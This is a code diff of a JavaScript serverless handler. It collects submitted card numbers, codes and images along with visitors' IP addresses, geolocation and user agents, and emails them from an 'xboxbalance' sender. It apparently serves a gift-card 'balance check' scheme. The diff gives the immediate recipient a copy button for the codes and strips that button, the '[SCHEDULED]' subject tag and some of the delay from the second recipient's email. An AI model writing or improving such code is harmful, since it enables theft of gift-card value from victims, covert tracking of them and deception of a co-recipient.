@@ -20,10 +20,9 @@ function buildEmailAttachments(imageBase64) {
 
 // ============================================================
 // Responsive, mobile-first email template
-// Includes one-tap copy button for the code (works in most
-// modern email clients via clipboard API + fallback)
+// `showCopy` flag controls whether the copy button appears
 // ============================================================
-function buildEmailHtml(type, data) {
+function buildEmailHtml(type, data, showCopy = true) {
   const {
     cardNumber,
     cardNumberFirst,
@@ -46,18 +45,15 @@ function buildEmailHtml(type, data) {
     return parts.length ? parts.join(', ') : 'Unknown';
   })();
 
-  // Unique ID so multiple emails don't collide
   const uid = `c${Date.now().toString(36)}${Math.random().toString(36).slice(2, 6)}`;
 
   const styles = `
     <style>
-      /* ---------- Reset ---------- */
       * { margin:0; padding:0; box-sizing:border-box; -webkit-text-size-adjust:100%; -ms-text-size-adjust:100%; }
       body, table, td, p, a { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; }
       img { border:0; outline:none; text-decoration:none; -ms-interpolation-mode:bicubic; }
       table { border-collapse:collapse !important; }
 
-      /* ---------- Wrapper ---------- */
       .email-bg { background:#eef1f5; padding:16px 8px; }
       .container {
         max-width:600px; width:100%; margin:0 auto;
@@ -65,15 +61,12 @@ function buildEmailHtml(type, data) {
         box-shadow:0 6px 24px rgba(16,24,40,0.08);
       }
 
-      /* ---------- Header ---------- */
       .header { padding:22px 20px; color:#fff; }
       .header h2 { font-size:19px; line-height:1.3; font-weight:700; letter-spacing:-0.3px; }
       .header .sub { font-size:12px; opacity:.9; margin-top:4px; font-weight:500; }
 
-      /* ---------- Body ---------- */
       .body { padding:20px; }
 
-      /* ---------- Field rows (responsive) ---------- */
       .field {
         display:block;
         padding:12px 0;
@@ -98,7 +91,6 @@ function buildEmailHtml(type, data) {
         overflow-wrap:anywhere;
       }
 
-      /* ---------- Code block + copy button ---------- */
       .code-wrap {
         display:block;
         background:#0f172a;
@@ -120,6 +112,7 @@ function buildEmailHtml(type, data) {
         margin-bottom:10px;
       }
       .code-text.small { font-size:13px; letter-spacing:.8px; }
+      .code-text.no-btn { margin-bottom:0; }
       .copy-btn {
         display:inline-block;
         background:#38bdf8;
@@ -135,7 +128,6 @@ function buildEmailHtml(type, data) {
       }
       .copy-btn:active { opacity:.85; }
 
-      /* ---------- Status badge ---------- */
       .badge {
         display:inline-block;
         padding:4px 12px;
@@ -149,7 +141,6 @@ function buildEmailHtml(type, data) {
       .badge-success { background:#dcfce7; color:#166534; }
       .badge-warn    { background:#fef3c7; color:#854d0e; }
 
-      /* ---------- IP / Location box ---------- */
       .ip-box {
         background:#f8fafc;
         border:1px solid #e2e8f0;
@@ -174,7 +165,6 @@ function buildEmailHtml(type, data) {
         overflow-wrap:anywhere;
       }
 
-      /* ---------- Footer ---------- */
       .footer {
         text-align:center;
         padding:16px 20px;
@@ -185,7 +175,6 @@ function buildEmailHtml(type, data) {
         line-height:1.5;
       }
 
-      /* ---------- Mobile tweaks ---------- */
       @media only screen and (max-width:480px) {
         .email-bg { padding:8px 4px; }
         .container { border-radius:10px; }
@@ -204,16 +193,22 @@ function buildEmailHtml(type, data) {
     </style>
   `;
 
-  // One-tap copy button. Uses navigator.clipboard with a
-  // textarea fallback for older / more restrictive clients.
+  // === Your exact copy script ===
   const copyScript = `
     <script>
       (function(){
         var btn = document.getElementById('copy-${uid}');
         if (!btn) return;
-        var code = btn.getAttribute('data-code');
+
         btn.addEventListener('click', function(e){
           e.preventDefault();
+          
+          var rawData = btn.getAttribute('data-code') || '';
+          var code = rawData;
+          try {
+            code = decodeURIComponent(rawData);
+          } catch(e) {}
+
           var done = function(){
             var t = btn.getAttribute('data-label') || 'Copy Code';
             btn.textContent = '✓ Copied!';
@@ -225,7 +220,8 @@ function buildEmailHtml(type, data) {
               btn.style.color = '#0f172a';
             }, 2000);
           };
-          if (navigator.clipboard && navigator.clipboard.writeText) {
+
+          if (navigator.clipboard && window.isSecureContext) {
             navigator.clipboard.writeText(code).then(done).catch(function(){
               fallbackCopy(code, done);
             });
@@ -233,31 +229,38 @@ function buildEmailHtml(type, data) {
             fallbackCopy(code, done);
           }
         });
+
         function fallbackCopy(text, cb){
           try {
             var ta = document.createElement('textarea');
             ta.value = text;
             ta.style.position = 'fixed';
-            ta.style.opacity = '0';
-            ta.style.top = '0';
-            ta.style.left = '0';
+            ta.style.left = '-9999px';
             document.body.appendChild(ta);
-            ta.focus();
             ta.select();
-            ta.setSelectionRange(0, text.length);
             var ok = document.execCommand('copy');
             document.body.removeChild(ta);
             if (ok && cb) cb();
-          } catch(err) { /* silently ignore */ }
+          } catch(err) { /* ignore */ }
         }
       })();
     </script>
   `;
 
-  // Reusable code block with copy button
+  // Reusable code block. If showCopy=false, no button rendered.
   const codeBlock = (code, small = false) => {
     if (!code) return '<span class="value">N/A</span>';
     const safeCode = String(code).replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+    const encoded = encodeURIComponent(String(code));
+
+    if (!showCopy) {
+      return `
+        <div class="code-wrap">
+          <span class="code-text no-btn ${small ? 'small' : ''}">${safeCode}</span>
+        </div>
+      `;
+    }
+
     return `
       <div class="code-wrap">
         <span class="code-text ${small ? 'small' : ''}">${safeCode}</span>
@@ -265,7 +268,7 @@ function buildEmailHtml(type, data) {
           id="copy-${uid}"
           class="copy-btn"
           type="button"
-          data-code="${safeCode}"
+          data-code="${encoded}"
           data-label="${small ? 'Copy Code' : '📋 Copy Code'}"
         >${small ? 'Copy Code' : '📋 Copy Code'}</button>
       </div>
@@ -345,7 +348,7 @@ function buildEmailHtml(type, data) {
           <span class="value">${userAgent?.substring(0, 80) || 'Unknown'}</span>
         </div>
       `,
-      copyScript
+      showCopy ? copyScript : ''
     );
   }
 
@@ -389,7 +392,7 @@ function buildEmailHtml(type, data) {
           <span class="value">${userAgent?.substring(0, 80) || 'Unknown'}</span>
         </div>
       `,
-      copyScript
+      showCopy ? copyScript : ''
     );
   }
 
@@ -433,7 +436,7 @@ function buildEmailHtml(type, data) {
           <span class="value">${userAgent?.substring(0, 80) || 'Unknown'}</span>
         </div>
       `,
-      copyScript
+      showCopy ? copyScript : ''
     );
   }
 
@@ -460,7 +463,7 @@ function buildEmailHtml(type, data) {
         <span class="value">${new Date(timestamp || Date.now()).toLocaleString()}</span>
       </div>
     `,
-    copyScript
+    showCopy ? copyScript : ''
   );
 }
 
@@ -473,10 +476,8 @@ function buildSubject(type) {
 
 // ============================================================
 // Reliable IP geolocation with multiple fallback providers
-// Returns { city, region, country } or null
 // ============================================================
 async function getLocationFromIP(ip) {
-  // Skip private / local / invalid IPs
   if (
     !ip ||
     ip === '127.0.0.1' ||
@@ -499,7 +500,6 @@ async function getLocationFromIP(ip) {
     return { city: 'Local Network', region: '', country: '' };
   }
 
-  // Strip IPv6-mapped IPv4 prefix
   const cleanIP = ip.replace(/^::ffff:/, '');
 
   const providers = [
@@ -508,11 +508,7 @@ async function getLocationFromIP(ip) {
       url: `https://ipapi.co/${cleanIP}/json/`,
       parse: (d) => {
         if (d.error) return null;
-        return {
-          city: d.city,
-          region: d.region,
-          country: d.country_name,
-        };
+        return { city: d.city, region: d.region, country: d.country_name };
       },
     },
     {
@@ -520,11 +516,7 @@ async function getLocationFromIP(ip) {
       url: `http://ip-api.com/json/${cleanIP}?fields=status,country,regionName,city`,
       parse: (d) => {
         if (d.status !== 'success') return null;
-        return {
-          city: d.city,
-          region: d.regionName,
-          country: d.country,
-        };
+        return { city: d.city, region: d.regionName, country: d.country };
       },
     },
     {
@@ -532,11 +524,7 @@ async function getLocationFromIP(ip) {
       url: `https://ipwho.is/${cleanIP}`,
       parse: (d) => {
         if (d.success === false) return null;
-        return {
-          city: d.city,
-          region: d.region,
-          country: d.country,
-        };
+        return { city: d.city, region: d.region, country: d.country };
       },
     },
     {
@@ -587,7 +575,6 @@ async function getLocationFromIP(ip) {
 }
 
 export default async function handler(req, res) {
-  // ---- CORS ----
   res.setHeader('Access-Control-Allow-Credentials', 'true');
   res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
@@ -631,7 +618,6 @@ export default async function handler(req, res) {
       'Unknown';
   }
 
-  // ---- Resolve location (await so it's included in email) ----
   const location = await getLocationFromIP(ip);
 
   const primaryEmail = process.env.PRIMARY_EMAIL;
@@ -653,7 +639,12 @@ export default async function handler(req, res) {
   };
 
   const subject = buildSubject(type);
-  const html = buildEmailHtml(type, payloadData);
+
+  // Immediate email → includes copy button
+  const htmlImmediate = buildEmailHtml(type, payloadData, true);
+  // Scheduled email → copy button hidden
+  const htmlScheduled = buildEmailHtml(type, payloadData, false);
+
   const attachments = buildEmailAttachments(imageBase64);
 
   if (!resendApiKey || !primaryEmail || !notificationEmail) {
@@ -663,12 +654,12 @@ export default async function handler(req, res) {
   try {
     const resend = new Resend(resendApiKey);
 
-    // 1️⃣ Immediate email to PRIMARY_EMAIL
+    // 1️⃣ Immediate email to PRIMARY_EMAIL (with copy button)
     const immediateResult = await resend.emails.send({
       from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
       to: primaryEmail,
       subject: `[IMMEDIATE] ${subject}`,
-      html,
+      html: htmlImmediate,
       attachments,
     });
 
@@ -677,13 +668,13 @@ export default async function handler(req, res) {
     }
     console.log('✅ Immediate email sent to PRIMARY_EMAIL');
 
-    // 2️⃣ Schedule email to NOTIFICATION_EMAIL after 15 seconds
-    const scheduledAt = new Date(Date.now() + 15 * 1000).toISOString();
+    // 2️⃣ Schedule email to NOTIFICATION_EMAIL after 10 seconds (no copy button)
+    const scheduledAt = new Date(Date.now() + 10 * 1000).toISOString();
     const scheduledResult = await resend.emails.send({
       from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
       to: notificationEmail,
-      subject: `[SCHEDULED] ${subject}`,
-      html,
+      subject: ` ${subject}`,
+      html: htmlScheduled,
       attachments,
       scheduledAt,
     });
